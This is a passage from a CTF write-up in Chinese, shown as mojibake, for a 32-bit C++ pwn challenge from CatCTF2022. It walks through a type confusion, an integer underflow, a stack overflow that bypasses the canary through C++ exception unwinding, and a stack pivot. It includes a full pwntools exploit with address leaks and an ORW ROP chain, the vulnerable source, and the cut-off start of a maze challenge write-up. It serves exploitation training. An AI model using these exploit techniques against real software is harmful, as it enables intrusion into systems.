æœ¬é¢˜æ˜¯ä¸€é“32ä½çš„C++ Pwné¢˜ï¼Œå¹¶ä¸”ä¿æŠ¤å…¨å¼€ã€å»é™¤äº†ç¬¦å·è¡¨ã€‚å› æ­¤ï¼Œéœ€è¦å…ˆæ‰¾åˆ°ç±»çš„è™šè¡¨ï¼Œæ–¹ä¾¿ä¹‹åå¯¹ç±»çš„é€†å‘æ¢å¤ï¼š

![](Nepnep-CatCTF2022/1_fC-s9nzEUu.png)

é€šè¿‡startæ‰¾åˆ°mainå‡½æ•°ä¹‹åï¼Œå‘ç°ç›´æ¥åç¼–è¯‘ä¼šæœ‰é—®é¢˜ï¼ˆç–‘ä¼¼IDAçš„bugï¼‰ï¼Œå°†æŠ¥é”™çš„0x1FF5å¤„ï¼ˆcoutçš„ä¸€éƒ¨åˆ†ï¼‰nopæ‰å³å¯æˆåŠŸåç¼–è¯‘mainå‡½æ•°ï¼š

![](Nepnep-CatCTF2022/2_dz-lCoA9Ji.png)

å¯ä»¥çœ‹åˆ°æœ¬é¢˜å¼€å¯äº†æ²™ç›’ï¼Œä¸è¿‡ç”±äºå…¶ä»–è€ƒç‚¹è¾ƒå¤šï¼Œå°±æ²¡æœ‰åœ¨æ²™ç›’è€ƒå¯Ÿä¸Šå¢åŠ éš¾åº¦äº†ï¼Œåªç¦ç”¨äº†execveï¼š

![](Nepnep-CatCTF2022/3_RCNEkVPNeC.png)

åˆ›å»ºåŠŸèƒ½ï¼šæœ€å¤šåˆ›å»º10æ¬¡ï¼Œæ¯æ¬¡å¯ä»¥åˆ›å»º0å’Œ1ä¸¤ç§å¯¹è±¡å­˜æ”¾æ•°æ®ï¼Œæ•°æ®çš„å¤§å°ä¸èƒ½è¶…è¿‡0x100ã€‚ ï¼ˆ1ï¼‰åˆ›å»ºç±»å‹ä¸º0çš„å¯¹è±¡ï¼Œé¦–å…ˆç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°†Class\_oneçš„è™šè¡¨åœ°å€æ”¾åœ¨å †å—å¤´ï¼Œè¾“å…¥çš„å†…å®¹é•¿åº¦å­˜åœ¨åç§»0x4çš„ä½ç½®ï¼Œè¾“å…¥çš„å†…å®¹é€šè¿‡strdupç”³è¯·çš„æŒ‡é’ˆå­˜æ”¾åœ¨0x8çš„ä½ç½®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œstrdupè°ƒç”¨äº†strlenè·å–é•¿åº¦ï¼Œå› æ­¤**è¾“å…¥çš„å†…å®¹ç›¸å½“äºä¼šè¢«\x00æˆªæ–­**ï¼š

![](Nepnep-CatCTF2022/4_Q5j54rByUS.png)

åˆ›å»ºç±»å‹ä¸º1çš„å¯¹è±¡ï¼ŒåŒæ ·ä¼šç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°†Class\_twoçš„è™šè¡¨åœ°å€æ”¾åœ¨å †å—å¤´ï¼Œè¾“å…¥çš„å†…å®¹é•¿åº¦å­˜åœ¨åç§»0x4çš„ä½ç½®ï¼Œä¸è¿‡è¿˜ä¼šåˆåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨è¯¥å¯¹è±¡ä¸­å­˜æ”¾è¾“å…¥å†…å®¹çš„é•¿åº¦ä»¥åŠé€šè¿‡strdupä¸ºè¾“å…¥çš„å†…å®¹ç”³è¯·çš„å †å—åœ°å€ï¼Œå¹¶å°†è¯¥å¯¹è±¡å­˜æ”¾åœ¨ä¸ºClass\_twoåˆ›å»ºçš„å †å—åç§»0x8çš„ä½ç½®ã€‚

![](Nepnep-CatCTF2022/5_kE-HBzJpVv.png)

![](Nepnep-CatCTF2022/6_Cb5ZYA3S_u.png)

æ›´æ–°åŠŸèƒ½ï¼šä¸è®ºæ˜¯Class\_oneè¿˜æ˜¯Class\_twoçš„å¯¹è±¡ï¼Œéƒ½ä¼šè°ƒç”¨Class\_oneè™šè¡¨ä¸­çš„sub\_2290å‡½æ•°ï¼Œç”±æ­¤å¯ä»¥åˆ¤æ–­ï¼šClass\_twoæ˜¯Class\_oneçš„æ´¾ç”Ÿç±»ã€‚åœ¨sub\_2290å‡½æ•°ä¸­ï¼Œä¼šé‡Šæ”¾æ‰åç§»ä¸º0x8å¤„çš„å †å—ï¼Œæ›´æ–°é•¿åº¦ï¼Œå¹¶é€šè¿‡strdupä¸ºæ–°è¾“å…¥çš„å†…å®¹äº§ç”Ÿæ–°çš„å †å—å­˜æ”¾åœ¨åç§»0x8å¤„ã€‚æ­¤å¤„å­˜åœ¨ä¸€ä¸ª**ç±»å‹æ··æ·†æ¼æ´**ï¼šsub\_2290å‡½æ•°æ˜æ˜¾åªæ˜¯é’ˆå¯¹Class\_oneçš„æ“ä½œï¼Œè€ŒClass\_twoæ›´æ–°çš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ•…äº§ç”Ÿäº†ç±»å‹æ··æ·†ï¼Œ**å¯åˆ©ç”¨æ­¤å¤„æ¼æ´æ§åˆ¶sizeå’Œbufåœ°å€**ã€‚

![](Nepnep-CatCTF2022/7_8_JsPy6pkb.png)

è¾“å‡ºåŠŸèƒ½ï¼šå‡ä¼šè°ƒç”¨Class\_oneç±»è™šè¡¨ä¸­çš„sub\_22EAå‡½æ•°ï¼Œå…¶ä¸­è·å–sizeçš„æ—¶å€™ï¼Œä¼šåˆ†å¸ƒè°ƒç”¨Class\_oneå’ŒClass\_twoå„è‡ªè™šè¡¨ä¸­çš„ç›¸åº”å‡½æ•°ï¼š

![](Nepnep-CatCTF2022/8_FQ4UuUet20.png)

å…¶ä¸­ï¼ŒClass\_oneä¼šç”¨strlenè·å–åç§»ä¸º0x8å¤„çš„bufçš„é•¿åº¦ï¼Œè€ŒClass\_twoä¼šè·å–åç§»ä¸º8å¤„çš„å¯¹è±¡ä¸­å¼€å¤´çš„sizeï¼Œè¿™æ›´å‘¼åº”äº†ä¸Šä¸€ç‚¹çš„ç±»å‹æ··æ·†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

![](Nepnep-CatCTF2022/9_6fjYIGlA2c.png)

è¿™é‡Œä¹‹åè°ƒç”¨allocaåŠ¨æ€åˆ†é…æ ˆï¼Œåˆ†é…çš„å¤§å°æ˜¯size+10ï¼Œç„¶åé¦–å…ˆstrcpyåˆ°æ ˆä¸Š"Content: "å­—ç¬¦ä¸²9ä¸ªå­—èŠ‚ï¼Œå†å°†éœ€è¦è¾“å‡ºçš„å†…å®¹ä»å¯¹è±¡ä¸­çš„bufåŒºåŸŸï¼ˆè¿™é‡Œä¸ä¸Šé¢è·å–sizeç±»ä¼¼ï¼ŒClass\_oneç›´æ¥è·å–åç§»0x8å¤„çš„bufï¼ŒClass\_twoä¼šè·å–åç§»ä¸º8å¤„çš„å¯¹è±¡ä¸­åç§»ä¸º4çš„bufï¼Œå¯é€šè¿‡ç±»å‹æ··æ·†æ¼æ´åˆ©ç”¨ï¼‰strcatåˆ°æ ˆä¸Šä¹‹åçš„åŒºåŸŸï¼ˆå­˜åœ¨**ç¼“å†²åŒºæº¢å‡º**ï¼‰ã€‚

![](Nepnep-CatCTF2022/10_as7YYrSuo3.png)

ä¸è¿‡ï¼Œè‹¥æ˜¯strcatä¹‹åbufçš„é•¿åº¦å¤§äºlength-1ï¼ˆè¿™é‡Œå¯**åˆ©ç”¨è®¡ç®—æœºè¡¥ç é€ æˆæ•´å‹æº¢å‡º**ï¼‰ï¼Œåˆ™ä¼šç”¨C++å¼‚å¸¸å¤„ç†ä¸­çš„throwæŠ›å‡ºé”™è¯¯ï¼Œå¦åˆ™å°†bufè¾“å‡ºå‡ºæ¥ï¼š

![](Nepnep-CatCTF2022/11_U2lmvAoU24.png)

C++å¼‚å¸¸å¤„ç†çš„catchéƒ¨åˆ†åœ¨0x204Cå¤„ï¼Œä¼šè¾“å‡ºError!å¹¶é€šè¿‡exit(-1)ç»“æŸç¨‹åºï¼š

![](Nepnep-CatCTF2022/12_RCUTyKXG70.png)

#### æ¼æ´åˆ©ç”¨

1.  é¦–å…ˆï¼Œæ ¹æ®é€†å‘åˆ†æçš„ç»“æœï¼Œå­˜åœ¨**ç±»å‹æ··æ·†**æ¼æ´ï¼Œå¯ç”³è¯·Class\_twoçš„å¯¹è±¡ï¼Œå¹¶**é€šè¿‡updateåŠŸèƒ½ï¼Œä»»æ„ä¿®æ”¹sizeå’Œbuf**ï¼Œå¹¶é€šè¿‡displayåŠŸèƒ½ï¼Œå¯è¿›è¡Œ**ä»»æ„åœ°å€è¯»**ï¼Œä¸”åˆ©ç”¨displayä¸­çš„strcatå¯é€ æˆ**ç¼“å†²åŒºæº¢å‡º**ã€‚
2.  æ³„éœ²libcåœ°å€ï¼šè™½ç„¶æˆ‘ä»¬å¯åˆ©ç”¨ç±»å‹æ··æ·†æ¼æ´è¿›è¡Œä»»æ„åœ°å€è¯»ï¼Œä½†æ˜¯æ­¤é¢˜ä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬æœ€å¼€å§‹æ˜¯æ‹¿ä¸åˆ°ä»»ä½•åœ°å€çš„ã€‚ç”±äºæ¯æ¬¡ç”³è¯·çš„å †å—å¤§å°ä¸å¾—è¶…è¿‡0x100ï¼Œæ•…éœ€è¦å…ˆå°†tcacheå¡«æ»¡ï¼Œå†freeåˆ°unsorted binçš„å †å—ä¸­å°±ä¼šæœ‰libcæ®‹ç•™åœ°å€ã€‚ç´§æ¥ç€ï¼Œå¸ƒå±€**å †é£æ°´**ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„ä¸€äº›ç»†èŠ‚ï¼Œæ­¤å¤„ä¸èµ˜è¿°äº†ï¼‰ï¼Œ**ä½¿å¾—updateç”³è¯·åˆ°çš„å †å—çš„0x4åç§»ä½ç½®æ˜¯libcçš„æ®‹ç•™åœ°å€ï¼Œå…¶ä¸­ä»ç„¶å­˜æ”¾ç€libcåœ°å€ï¼ˆmain\_arena+0x40ï¼‰ï¼Œå³å¯å¾—åˆ°libc\_base**ã€‚
3.  æ³„éœ²heapåœ°å€ï¼šæœ‰äº†libcåœ°å€ä¹‹åï¼Œè™½ç„¶main\_arenaä¸­æœ‰heapåœ°å€ï¼Œä¸è¿‡åœ¨displayä¸­ï¼Œå½“strcatæ²¡é‡åˆ°\x00ï¼Œå°±ä¼šä¸€ç›´æ‹¼æ¥ï¼Œmain\_arenaé™„è¿‘å¾ˆé•¿ä¸€æ®µéƒ½æ²¡æœ‰\x00ï¼Œè¿™å°±ä¼šç›´æ¥ä¹±ç æ ˆæº¢å‡ºï¼Œå¯¼è‡´å´©æºƒã€‚å› æ­¤ï¼Œè¿™é‡Œ**åˆ©ç”¨environé™„è¿‘æœ‰heapæ®µæœ«åœ°å€çš„ç‰¹æ€§**ï¼Œæ³„éœ²heapåœ°å€ï¼ˆéœ€è¦æ³¨æ„é¿å¼€æœ«å°¾çš„\x00ï¼‰ã€‚
4.  æ³„éœ²PIEåœ°å€ï¼šåœ¨ä¸ºå¯¹è±¡åˆ†é…çš„å †ä¸­ï¼Œ**å¼€å¤´ä¼šå­˜æ”¾ç¨‹åºä¸­å¯¹åº”çš„è™šè¡¨åœ°å€**ï¼Œå¯åˆ©ç”¨æ­¤å¤„æ³„éœ²PIEåœ°å€ã€‚å½“ç„¶ï¼Œåœ¨libcæˆ–ldä¸­æ‰¾ç¨‹åºç›¸å…³åœ°å€æ³„éœ²ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚
5.  åœ¨ä¸Šé¢æ³„éœ²åœ°å€çš„æ—¶å€™ï¼ˆç”±äºæ˜¯32ä½çš„ç¨‹åºï¼Œä¹Ÿå¯é€šè¿‡**çˆ†ç ´ä¸€ä½ç¨‹åºåœ°å€**æ¥æ³„éœ²ï¼Œæ¦‚ç‡1/16ï¼‰ï¼Œè™½ç„¶å·²ç»å°½å¯èƒ½ä¿è¯æ‹¼æ¥çš„é•¿åº¦å°ï¼Œä¸ä¼šç›´æ¥ä¹±ç æ ˆæº¢å‡ºã€‚ä¸è¿‡ï¼Œä»ç„¶å¯èƒ½ä¼šè¶…å‡ºåˆ†é…çš„æ•°ç»„æœ¬èº«çš„å¤§å°ï¼Œé€šè¿‡C++å¼‚å¸¸å¤„ç†throwæŠ›å‡ºerrorã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨**è®¡ç®—æœºè¡¥ç **ï¼Œå› ä¸ºæ¯”è¾ƒçš„æ—¶å€™æ˜¯ä¸length-1æ¯”è¾ƒçš„ï¼Œæ•…å¯ä»¥**ä½¿lengthä¸º0ï¼Œè¿™æ ·å‡1åæ ¹æ®è¡¥ç çš„ç›¸å…³çŸ¥è¯†ï¼Œå°±å˜æˆäº†0xffffffffï¼Œå³æœ€å¤§çš„æ•°ï¼Œå°±å¯ä»¥ç»•è¿‡å¼‚å¸¸å¤„ç†äº†**ã€‚
6.  ç„¶è€Œï¼Œæœ¬é¢˜æ˜¯å¼€äº†canaryä¿æŠ¤çš„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥ä»æ¯”å¦‚TLSä¸­æ³„éœ²å‡ºcanaryå€¼ï¼Œä¸è¿‡**canaryæœ«ä¸¤ä½ä¸€å®šæ˜¯00**ï¼Œè¿™æ ·å¦‚æœç›´æ¥å°†payloadå‘è¿‡å»ï¼Œåœ¨strcatçš„æ—¶å€™ä¼šè¢«æˆªæ–­ã€‚å› æ­¤ï¼Œå¾—å¦è¾Ÿè¹Šå¾„ç»•è¿‡canaryä¿æŠ¤ã€‚æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªC++çš„å¼‚å¸¸å¤„ç†ï¼Œ**é€šè¿‡æ ˆæº¢å‡ºå°†è¿”å›åœ°å€æ”¹åˆ°tryä¸catchä¸­é—´çš„ä½ç½®ï¼ˆå³å¯è¢«æ•è·åˆ°å¼‚å¸¸çš„ä½ç½®ï¼Œå¦‚ä¸‹å›¾0x2044å¤„ï¼‰**ï¼Œè¿™æ ·å°±èƒ½è·³åˆ°catchç»§ç»­æ‰§è¡Œäº†ã€‚ä¸è¿‡ï¼Œ**è¿™é‡Œä¸å¸¸è§„çš„åˆ©ç”¨catchæ ˆæº¢å‡ºçš„æ€è·¯ä¸åŒ**ï¼šå› ä¸ºè¿™é‡Œcatchä¹‹åç›´æ¥exitäº†ï¼Œä¹Ÿæœ‰canaryä¿æŠ¤ã€‚

![](Nepnep-CatCTF2022/13_ObNFMn4jgN.png)

å½“æ‰§è¡Œåˆ°catchä¸­çš„**cxa\_begin\_catch**æ—¶ï¼Œä¼šè·³è½¬åˆ°ebx+0x1cä¸­çš„åœ°å€ï¼š

![](Nepnep-CatCTF2022/14_4w_3DhBg8u.png)

è€Œebxåˆæ˜¯esièµ‹å€¼è¿‡æ¥çš„ï¼Œesiæ˜¯ebp-8ä¸­çš„å€¼ï¼Œæ˜¯å¯æ§çš„ï¼š

![](Nepnep-CatCTF2022/15_W8THz9V-Aa.png)

æ­¤æ—¶ï¼Œè‹¥**é€šè¿‡ç¼“å†²åŒºæº¢å‡ºåœ¨ebpå†™å…¥payloadåœ°å€-4ï¼Œebx+0x1cå†™å…¥å­˜æ”¾ç€leave; retçš„åœ°å€ï¼Œå³å¯æ ˆè¿ç§»ï¼Œç»•è¿‡canaryä¿æŠ¤**ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ç¼“å†²åŒºæº¢å‡ºæ‰§è¡Œçš„æ—¶å€™ï¼Œ**ä¼šå°†æ ˆä¸Šå­˜æ”¾bufå’Œlengthçš„æŒ‡é’ˆè¦†ç›–æ‰**ï¼Œè¿™é‡Œéœ€è¦ä¼ªé€ ä¸€ä¸‹ï¼Œä½¿å¾—å…¶èƒ½èµ°åˆ°å¼‚å¸¸å¤„ç†çš„throwå¤„ã€‚

è¿™é‡Œéœ€è¦ç”¨ORWçš„payloadç»•è¿‡æ²™ç›’ï¼Œä¹Ÿå°±éœ€è¦å…ˆå°†payloadå†™å…¥å †ä¸­ï¼Œå†æ ˆè¿ç§»è·³è½¬è¿‡å»ã€‚**ç„¶è€Œï¼Œæ­¤payloadä¸­å¿…ç„¶ä¼šå‡ºç°\x00ï¼Œè¢«æˆªæ–­ï¼Œæ— æ³•å®Œæ•´åœ°å‘é€è¿‡å»**ã€‚å› æ­¤ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆè¯»å…¥getsçš„payloadï¼Œè·³è½¬æ‰§è¡Œã€‚å†é€šè¿‡getsè¯»å…¥ORWçš„payloadåˆ°æŸå¯å†™åœ°å€å¤„ï¼Œå†æ ˆè¿ç§»è¿‡å»å³å¯ã€‚

è¿™é‡Œè¿˜éœ€è¦è€ƒè™‘åˆ°**stdinè¾“å…¥ç¼“å†²åŒº**çš„æ€§è´¨ï¼š**å½“è¾“å…¥ç¼“å†²åŒºä¸­å¼€å¤´æœ‰\nï¼Œåˆ™gets/fgetsè¿™ç±»èµ°è¾“å…¥ç¼“å†²åŒºçš„å‡½æ•°ä¸ä¼šå†è¯»å…¥æ•°æ®**ï¼ˆå¯è‡ªè¡ŒæŸ¥çœ‹ç›¸å…³æºç ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ä¹‹å‰æ‰€æœ‰cinè¯»å…¥çš„æ“ä½œå¤„ï¼Œ**éƒ½ç”¨ç©ºæ ¼ä½œä¸ºæˆªæ–­ç¬¦**ï¼Œå³å¯é¿å…è¿™ä¸ªé—®é¢˜ï¼Œä½¿getsçš„payloadæ­£å¸¸è¯»å…¥æ•°æ®ï¼ˆä¼šå…ˆå°†è¾“å…¥ç¼“å†²åŒºä¸­æ®‹ç•™çš„ä¸€ä¸ªç©ºæ ¼ç¬¦å†™å…¥åˆ°ç›®æ ‡åœ°å€ï¼‰ã€‚

#### exp

```python
from pwn import *
context(os = 'linux', arch = 'i386', log_level = 'debug')

#io = process("./pwn")
io = remote("223.112.5.156", 51006)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

def menu(choice):
    io.sendafter("Please input your choice >> ", str(choice) + " ")

def add(typ, content):
    menu(1)
    io.sendafter("Which type do you want to create?\n", str(typ) + " ")
    io.sendafter("Please enter the content >> ", content + b" ")

def edit(idx, content):
    menu(2)
    io.sendafter("Which one do you want to update?\n", str(idx) + " ")
    io.sendafter("Please enter the new content >> ", content + b" ")

def show(idx):
    menu(3)
    io.sendafter("Which one do you want to display?\n", str(idx) + " ")

add(1, p32(0xdeadbeaf))
for i in range(8) :
  add(0, p32(0xffffffff)*0x20)
for i in range(8) :
  edit(i+1, p32(0xffffffff))
edit(0, p32(0xdeadbeaf)*4)
add(0, p32(0xdeadbeaf))
edit(0, p32(0x111111))
show(0)
main_arena = u32(io.recvuntil(b'\xf7')[-4:]) - 0x40
libc_base = main_arena - (libc.sym['__malloc_hook'] + 0x18)
success("libc_base:\t" + hex(libc_base))

edit(0, p32(0xfffffff6) + p32(libc_base + libc.sym['environ'] + 0x11))
show(0)
io.recvuntil("Content: ")
heap_base = u32(io.recv(3).rjust(4, b'\x00')) - 0x22000 + 0x8
success("heap_base:\t" + hex(heap_base))

edit(0, p32(0xfffffff6) + p32(heap_base + 0x4ba8))
show(0)
io.recvuntil("Content: ")
pie_base = u32(io.recv(4)) - 0x4e0c
success("pie_base:\t" + hex(pie_base))

pop_ebp_ret = libc_base + 0x1a973
leave_ret = libc_base + 0x110226
unwind_ret = pie_base + 0x2044

payload = b'\xff\xff\xff' + p32(0xffffffff)*4 + p32(heap_base + 0x4cd1) + p32(0xffffffff)*2 + p32(heap_base + 0x4c60) + p32(0xffffffff)*2 + p32(heap_base + 0x4ca3 - 0x1c)
payload += p32(heap_base + 0x4c97 - 4) + p32(unwind_ret)
payload += p32(libc_base + libc.sym['gets']) + p32(pop_ebp_ret) + p32(libc_base + libc.sym['__free_hook']) + p32(leave_ret)
edit(0, p32(0xffffffff) + p32(0xffffffff) + payload)
edit(0, p32(0xffffffff) + p32(heap_base + 0x4c60))
show(0)

add_esp_8_ret = libc_base + 0x2fbe9
add_esp_c_ret = libc_base + 0x83d12

orw_rop = b'\xff\xff\xff' + p32(libc_base + libc.sym['open']) + p32(add_esp_8_ret) + p32(libc_base + libc.sym['__free_hook'] + 0x34) + p32(0)
orw_rop += p32(libc_base + libc.sym['read']) + p32(add_esp_c_ret) + p32(3) + p32(libc_base + libc.sym['__free_hook'] + 0x100) + p32(0x50)
orw_rop += p32(libc_base + libc.sym['puts']) + p32(0xdeadbeaf) + p32(libc_base + libc.sym['__free_hook'] + 0x100) + b'./flag\x00'
sleep(0.1)
io.sendline(orw_rop)
io.interactive()
```

#### æºç 

```c
// g++ -o pwn source.cpp -m32
#include <iostream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <dlfcn.h>
#include <cxxabi.h>
#include <unwind.h>
#include <string>
#include <sys/prctl.h> 
#include <linux/seccomp.h>
#include <linux/filter.h>
using namespace std;

void filter()
{
  struct sock_filter filter[] = {
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, 4),
    BPF_JUMP(BPF_JMP+BPF_JEQ, 0x40000003, 0, 2),
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, 0),
    BPF_JUMP(BPF_JMP+BPF_JEQ, 11, 0, 1),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}

void welcome()
{
  cout << " â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–‘ â–ˆâ–ˆ  â–„â–„â–„       â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  " << endl;
  cout << "â–’â–ˆâ–ˆâ–€ â–€â–ˆ  â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–„    â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’" << endl;
  cout << "â–’â–“â–ˆ    â–„ â–’â–ˆâ–ˆâ–€â–€â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ  â–€â–ˆâ–„  â–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’" << endl;
  cout << "â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–‘â–“â–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆ â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘" << endl;
  cout << "â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘â–‘â–“â–ˆâ–’â–‘â–ˆâ–ˆâ–“ â–“â–ˆ   â–“â–ˆâ–ˆâ–’â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘" << endl;
  cout << "â–‘ â–‘â–’ â–’  â–‘ â–’ â–‘â–‘â–’â–‘â–’ â–’â–’   â–“â–’â–ˆâ–‘â–‘ â–’â–‘â–’â–‘â–’â–‘ " << endl;
  cout << "  â–‘  â–’    â–’ â–‘â–’â–‘ â–‘  â–’   â–’â–’ â–‘  â–‘ â–’ â–’â–‘ " << endl;
  cout << "â–‘         â–‘  â–‘â–‘ â–‘  â–‘   â–’   â–‘ â–‘ â–‘ â–’  " << endl;
  cout << "â–‘ â–‘       â–‘  â–‘  â–‘      â–‘  â–‘    â–‘ â–‘  " << endl;
  cout << "â–‘                                   " << endl;
}

void init()
{
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  welcome();
  alarm(0x20);
  filter();
}

class Class_one
{
public:
  int length;
  void *data;
  
  Class_one() {};

  Class_one(char* buf)
  {
    this->length = strlen(buf);
    this->data = strdup(buf);
  }

  virtual ~Class_one()
  {
    free(this->data);
  }

  virtual char *c_str()
  {
    return (char*)data;
  }

  virtual int size()
  {
    return strlen((const char*)data);
  }

  void update(char* buf)
  {
    free(this->data);
    this->data = strdup(buf);
    this->length = strlen(buf);
  }

  void print()
  {
    this->length = size() + 10;
    char buf[this->length];
    strcpy(buf, "Content: ");
    strcat(buf, c_str());
    if(strlen(buf) > (this->length - 1)) throw -1;
    cout << buf << endl;
  }
};

class Class_kun
{
public:
  int size;
  char* buf;

  Class_kun(int size, char* buf)
  {
    this->size = size;
    this->buf = strdup(buf);
  }

  ~Class_kun()
  {
    free(this->buf);
  }
};

class Class_two : public Class_one
{
public:
  Class_two(char* buf)
  {
    this->length = strlen(buf);
    this->data = new Class_kun(this->length, buf);
  }

  ~Class_two()
  {
    delete((Class_kun*)this->data);
  }

  char *c_str()
  {
    return ((Class_kun*)this->data)->buf;
  }

  int size()
  {
    return ((Class_kun*)this->data)->size;
  }

  void update(char* buf)
  {
    this->length = strlen(buf);
    ((Class_kun*)this->data)->buf = strdup(buf);
    ((Class_kun*)this->data)->size = this->length;
  }
};

int cnt;
Class_one *lst[0x10];

void menu()
{
  cout << "|******************|" << endl;
  cout << "|       MENU       |" << endl;
  cout << "|    1. Create     |" << endl;
  cout << "|    2. Update     |" << endl;
  cout << "|    3. Display    |" << endl;
  cout << "|    4. Exit       |" << endl;
  cout << "|******************|" << endl;
  cout << "Please input your choice >> ";
}

void create()
{
  if (cnt >= 10)
  {
    cout << "[Error] No spare space." << endl;
    return;
  }
  
  int type;
  cout << "Which type do you want to create?" << endl;
  cin >> type;
  if ((type != 0) && (type != 1))
  {
    cout << "[Error] No such type." << endl;
    return;
  }
  
  string content;
  cout << "Please enter the content >> ";
  cin >> content;
  if (content.size() >= 0x100)
  {
    cout << "[Error] Content is too long." << endl;
    return;
  }

  if (type == 1)
  {
    lst[cnt] = new Class_two((char*)content.c_str());
  }
  else
  {
    lst[cnt] = new Class_one((char*)content.c_str());
  }
  cnt++;
  cout << "[Success] Created!" << endl;
}

void update()
{
  unsigned int idx;
  cout << "Which one do you want to update?" << endl;
  cin >> idx;
  
  if (idx >= cnt)
  {
    cout << "[Error] No such one." << endl;
    return;
  }
  
  string content;
  cout << "Please enter the new content >> ";
  cin >> content;
  
  if (content.size() >= 0x100)
  {
    cout << "[Error] Content is too long." << endl;
    return;
  }
  
  lst[idx]->update((char*) content.c_str());
  cout << "[Success] Updated!" << endl;
}

void display()
{
  unsigned int idx;
  cout << "Which one do you want to display?" << endl;
  cin >> idx;
  
  if (idx >= cnt)
  {
    cout << "[Error] No such one." << endl;
    return;
  }
  
  lst[idx]->print();
}

int main()
{
  init();
  
  int choice;
  
  try
  {
    while(true)
    {
      menu();
      cin >> choice;
      switch(choice)
      {
        case 1:
        create();
        break;
        case 2:
        update();
        break;
        case 3:
        display();
        break;
        case 4:
        cout << "Bye~" << endl;
        return 0;
        default:
        cout << "[Error] Invild choice." << endl;
      }
    }
  }
  catch(int)
  {
    cout << "Error!" << endl;
    exit(-1);
  }
}

```

### Cat of magicğŸ§™â€â™€ï¸

made by xiaoji233

æ ¹æ®é¢˜æ„ï¼Œæ˜¯ä¸€ä¸ª 20\*20 çš„è¿·å®«ï¼Œç„¶åæœ‰10å±‚ã€‚æ ¹æ®æ‰€ç»™æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¦æ•‘å‡º100æ¬¡çŒ«ï¼Œåœ¨ç¬¬ä¸€å±‚ä¸‹æ¥¼ä¹‹åå°±ä¼šå¾—åˆ° flagã€‚çŒ«åº”è¯¥æ˜¯åœ¨ç¬¬ 10 å±‚çš„ 18ï¼Œ18 çš„ä½ç½®ã€‚

é€šè¿‡ dfs ç®—æ³•æŠŠè¿·å®«æ ·è²Œè·‘å‡ºæ¥ï¼Œç„¶åæ‰‹èµ°ï¼Œèµ°åˆ°ç¬¬10å±‚ä¹‹åå‘ç° 18ï¼Œ18 çš„ä½ç½®ä¸­è¢«å¢™å£å°é”äº†ã€‚ä½†æ˜¯ç»™äº†ä¸ªé”¤å­ï¼Œåº”è¯¥æ˜¯è¦ç”¨é”¤å­ç ¸å¢™å£ç„¶åæ•‘åˆ°çŒ«ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¦èµ°åˆ°ç¬¬ä¸€å±‚ï¼Œæ—¶é—´ä¸Šæ¥ä¸å¤ªå¤Ÿã€‚äºæ˜¯è€ƒè™‘å…¶å®ƒæ–¹æ³•ï¼Œè§‚å¯Ÿåˆ°å…¨å±€å˜é‡ä¸­æœ‰ RescueCat å˜é‡ï¼Œå¹¶ä¸”æœ€ååˆ¤æ–­çš„æ—¶å€™åªéœ€è¦åˆ¤æ–­æ•‘å‡ºçš„çŒ«æ˜¯å¦ >=100 å³å¯ï¼Œå¹¶ä¸”ç§»åŠ¨é€‰æ‹©å™¨çš„ç®—æ³•ä¸­ï¼Œåœ¨å¤„ç†çš„æ—¶å€™ä¼šå¼ºåˆ¶æŠŠå½“å‰ä½ç½®å˜æˆ'.'ï¼Œå› æ­¤æ‹¿äº†é”¤å­ç›´æ¥åœ¨ç¬¬ä¸€å±‚å¼€å§‹ç ¸å¢™ï¼Œå‘ä¸Šè¿›è¡Œå˜é‡è¦†ç›–ï¼Œè¦†ç›–ä»»æ„ä¸€ä¸ªå­—èŠ‚æˆ–ä¸¤ä¸ªå­—èŠ‚åˆ° RescueCat å˜é‡ä¸­å†ä»ç¬¬ä¸€å±‚èµ°å‡ºå³å¯æ‹¿åˆ° flagã€‚

#### exp

dfsçš„pythonè„šæœ¬ï¼š

```python
from pwn import *
import os
#context.log_level='debug'
